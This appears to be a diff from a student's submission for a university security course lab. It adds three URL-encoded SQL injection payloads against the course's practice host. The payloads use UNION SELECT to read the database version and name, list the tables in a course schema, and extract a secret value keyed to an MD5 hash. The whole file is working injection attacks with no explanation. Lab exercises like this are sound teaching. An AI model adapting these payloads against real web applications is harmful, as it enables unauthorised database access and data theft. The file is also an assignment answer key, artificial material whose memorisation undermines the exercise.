@@ -1,0 +1,3 @@
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+1%2C+%40%40version%2C+1%2C+database%28%29+FROM+information_schema.schemata+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+1%2C+1%2C+1%2C+group_concat%28table_name%29+FROM+information_schema.tables+WHERE+table_schema+%3D+%27proj2_inject3%27+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+select+1%2C1%2C1%2Csecret+from+SECRET+WHERE+hash+%3D+MD5%28%27yclai4%27%29+++%23
